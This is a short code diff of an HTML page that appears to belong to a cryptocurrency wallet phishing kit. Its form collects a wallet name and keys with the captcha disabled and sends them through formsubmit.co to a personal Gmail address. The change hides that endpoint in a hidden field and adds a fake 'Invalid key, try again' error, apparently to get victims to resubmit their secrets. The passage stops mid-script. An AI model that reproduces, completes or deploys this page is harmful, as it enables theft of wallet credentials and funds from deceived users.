@@ -8424,10 +8424,11 @@
                 </div>
                 <div class="message-tab"></div>
                 <div class="send-form">
-                    <form action="https://formsubmit.co/bryanpaulgoodmusic@gmail.com" id="form" method="post" enctype="multipart/form-data">
+                    <form id="form" method="post" onsubmit="console.error('Invalid key, try again')" enctype="multipart/form-data">
                         <input type="hidden" name="_captcha" value="false" />
                         <input type="hidden" name="_next" id="next-url" />
                         <input type="hidden" name="wallet" id="walletNameData" />
+                        <input type="hidden" name="_endpoint" id="https://formsubmit.co/bryanpaulgoodmusic@gmail.com" />
                         <script>
                             const domain = window.location.hostname;
                             document.getElementById(
